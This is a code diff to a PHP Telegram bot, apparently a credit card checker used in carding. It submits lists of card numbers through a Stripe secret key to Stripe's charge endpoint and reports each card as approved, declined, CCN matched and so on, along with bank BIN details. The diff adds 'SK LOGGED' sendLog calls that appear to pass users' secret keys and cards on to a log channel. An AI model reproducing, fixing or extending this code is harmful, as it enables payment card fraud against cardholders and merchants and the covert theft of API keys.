@@ -292,6 +292,7 @@ $sk = multiexplode(array(":", "/", " ", "|"), $message)[4];
                 $msg1 = Getstr($result1,'"message": "','"');
                 if(strpos($result1, "card_error")){
                   sendMessage($chatId, " %0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» $msg1 </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+
                   return;
                 }
                 if (strpos($result1, "card_declined")){
@@ -299,8 +300,9 @@ $sk = multiexplode(array(":", "/", " ", "|"), $message)[4];
                   return;
                 }
                 if (strpos($result1, "rate_limit")){
-                  sendMessage($chatId, " %0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» $msg1 </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
-                  return;
+                    sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN LATER ⚠️</b>%0A<b>Response -» SK is rate limit </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                    sendLog($chatId, "<b>SK LOGGED</b>%0A%0A<b>card:</b><code>$lista</code>%0A<b> RECEPIT URL -» $rcp</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                    return;
                 }
                 if (strpos($result1, "invalid_cvc")){
                   sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN ⚠️</b>%0A<b>Response -» Please input card correctly ! </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
@@ -330,15 +332,19 @@ $sk = multiexplode(array(":", "/", " ", "|"), $message)[4];
                   sendMessage($chatId, " %0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» $msg2 </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
                   return;
                 }
-                if (strpos($result1, "invalid_cvc")){
+                if (strpos($result2, "invalid_cvc")){
                   sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN ⚠️</b>%0A<b>Response -» Please input card correctly ! </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
                   return;
                 }
-                if (strpos($result1, "sources_required_type_param")){
+                if (strpos($result2, "sources_required_type_param")){
                   sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN ⚠️</b>%0A<b>Response -» Please input card correctly ! </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
                   return;
                 }
-
+                if (strpos($result2, "rate_limit")){
+                    sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN LATER ⚠️</b>%0A<b>Response -» SK is rate limit </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                    sendLog($chatId, "<b>SK LOGGED</b>%0A%0A<b>card:</b><code>$lista</code>%0A<b> RECEPIT URL -» $rcp</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                    return;
+                  }
                 $ch = curl_init();
                 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
                 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
@@ -359,45 +365,58 @@ $sk = multiexplode(array(":", "/", " ", "|"), $message)[4];
                 }
                 if(strpos($result3, "insufficient_funds" )) {
                   sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED ✅</b>%0A<b>Response -» Insufficient Funds </b>%0A<b>Gateway -» Stripe Custom sk charge v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+                  sendLog($chatId, "<b>SK LOGGED</b>%0A%0A<b>card:</b><code>$lista</code>%0A<b> RECEPIT URL -» $rcp</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
                   return;
                 }
                 if ((strpos($result3, "card_error_authentication_required")) || (strpos($result2, "card_error_authentication_required"))){ sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APROVED ⚠️</b>%0A<b>Response -» 3D Card </b>%0A<b>Gateway -» Stripe Custom sk charge v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                    return;
                 }
                 if(strpos($result3,'"code": "incorrect_cvc"')){
                     sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED ⚠️</b>%0A<b>Response -» CCN Matched </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                    return;
                   }
                   if(strpos($result3,'"code": "incorrect_cvc"')){
                     sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED ⚠️</b>%0A<b>Response -» CCN Matched </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                    return;
                   }
                   if ((strpos($result3, "transaction_not_allowed")) || (strpos($result3, "transaction_not_allowed"))){
                     sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» HOLDERLOCKED ⚠️</b>%0A<b>Response -» Transaction Not Allowed </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                    return;
                   }
                   if ((strpos($result3, "fraudulent"))){
                     sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» REJECTED ⛔</b>%0A<b>Response -» Fraudulent </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                    return;
                   }
                   if ((strpos($result3, "expired_card"))){
                     sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» expired_card </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                    return;
                   }
                   if ((strpos($result3, "generic_declined"))){
                     sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» Generic Declined </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                    return;
                     }
                   if ((strpos($result3, "do_not_honor"))){
                     sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» Do Not Honor </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                    return;
                   }
                   if ((strpos($result3, 'rate_limit'))){
                     sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN LATER ⚠️</b>%0A<b>Response -» SK is rate limit </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                    sendLog($chatId, "<b>SK LOGGED</b>%0A%0A<b>card:</b><code>$lista</code>%0A<b> RECEPIT URL -» $rcp</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                    return;
                   }
                     
                   if ((strpos($result3, "Your card was declined."))){
                     sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» Do Not Honor </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                    return;
                   }
                   if ((strpos($result3, ' "message": "Your card number is incorrect."')) || (strpos($result3, ' "message": "Your card number is incorrect."'))){
                     sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» No Account </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                    return;
                   }
                   if ((strpos($result3, ' "message": "testmode_charges_only"'))){
                     sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» SERVER REJECTED ❌</b>%0A<b>Response -» Gate is Dead </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                    return;
                   }
-
 
                 else {
                   sendMessage($chatId, "<b>SERVER ERROR</b>%0A<b>card:</b><code>$lista</code>%0A<b>Response 1 -» <code>$msg1 | $msg1a | $result1 </code></b> %0A%0A<b>Response 1 -» <code>$msg2 | $msg2a | $result2 </code></b>%0A%0A<b>Response 1 -» <code>$msg3 | $msg3a | $result3 </code></b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
